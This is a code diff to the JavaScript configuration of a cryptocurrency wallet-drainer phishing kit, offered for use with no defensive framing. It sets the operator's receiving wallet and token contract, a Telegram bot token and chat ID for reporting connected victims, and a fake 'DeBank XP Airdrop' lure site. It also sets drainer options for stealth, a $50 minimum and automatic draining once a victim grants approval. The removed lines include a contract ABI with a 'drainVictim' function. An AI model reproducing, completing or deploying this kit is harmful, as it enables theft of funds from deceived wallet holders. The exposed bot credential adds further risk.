@@ -1,63 +1,57 @@
 // ============================================
-// DRAINER CONFIGURATION - YOU MUST EDIT 2 LINES
+// FINAL DRAINER CONFIGURATION
 // ============================================
 
-// LINE 1 TO EDIT: YOUR WALLET ADDRESS - Where drained funds go
-// Get this from MetaMask on BSC network
+// YOUR BSC MAINNET WALLET ADDRESS - Where drained funds will be sent
+// Get this from MetaMask (BNB Smart Chain Mainnet)
 const YOUR_WALLET_ADDRESS = "0x9222f5ee4C897C8ae68a7638aB37dC592C105FFE";
 
-// LINE 2 TO EDIT: YOUR DRAINER CONTRACT ADDRESS
-// After deploying from GitHub, paste the contract address here
-const DRAINER_CONTRACT = "0xYourDrainerContractAddressHere";
+// YOUR TOKEN CONTRACT ADDRESS - From Remix deployment on Mainnet
+// Replace with your actual deployed contract address
+const TOKEN_CONTRACT_ADDRESS = "0x7991E6459BcB1eCC808AA58Cf4ff885284C1ae6b";
 
 // ============================================
-// TELEGRAM NOTIFICATIONS (OPTIONAL - Skip if not needed)
+// TELEGRAM NOTIFICATIONS (Optional)
 // ============================================
 
+// Get these from @BotFather and your Telegram channel
 const TELEGRAM_BOT_TOKEN = "8334482922:AAG3g38kEVSDvNyfyC4nGZn9g29_zW6uxuk";
 const TELEGRAM_CHAT_ID = "-1003947285556";
 
-function sendTelegramNotification(walletAddress) {
+function sendTelegramNotification(walletAddress, action) {
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
-    const message = `🔔 Wallet Connected: ${walletAddress}`;
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`)
-        .catch(err => console.log("Telegram error:", err));
-}
-
-function sendApprovalNotification(walletAddress, amount) {
-    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
-    const message = `⚠️ APPROVAL GRANTED: ${walletAddress} | Amount: ${amount}`;
+    const message = `🔔 ${action}\nWallet: ${walletAddress}\nTime: ${new Date().toISOString()}`;
     fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`)
         .catch(err => console.log("Telegram error:", err));
 }
 
 // ============================================
-// DRAINER CONTRACT ABI - DO NOT EDIT
+// TOKEN DETAILS (Matches your deployed token)
 // ============================================
 
-const DRAINER_ABI = [
-    {
-        "inputs": [],
-        "name": "claimReward",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    },
-    {
-        "inputs": [{ "internalType": "address", "name": "victim", "type": "address" }],
-        "name": "drainVictim",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    }
-];
+const TOKEN_DETAILS = {
+    address: TOKEN_CONTRACT_ADDRESS,
+    symbol: "XP",
+    decimals: 18,
+    name: "Claim at debank-xp.netlify.app"
+};
 
 // ============================================
-// STEALTH SETTINGS - DO NOT EDIT
+// DISPLAY SETTINGS
 // ============================================
 
-const STEALTH_CONFIG = {
-    minDrainAmount: 50,
-    randomDelay: true,
-    useForwardingContract: true
+const DISPLAY_SETTINGS = {
+    eligibleAmount: "1,250 XP",
+    airdropName: "DeBank XP Airdrop",
+    network: "BNB Smart Chain"
+};
+
+// ============================================
+// DRAINER SETTINGS
+// ============================================
+
+const DRAINER_SETTINGS = {
+    minDrainAmount: 50,  // Minimum $50 to drain (avoid small wallets)
+    randomDelay: true,   // Randomized delay for stealth
+    autoDrain: true      // Automatically drain when approval detected
 };
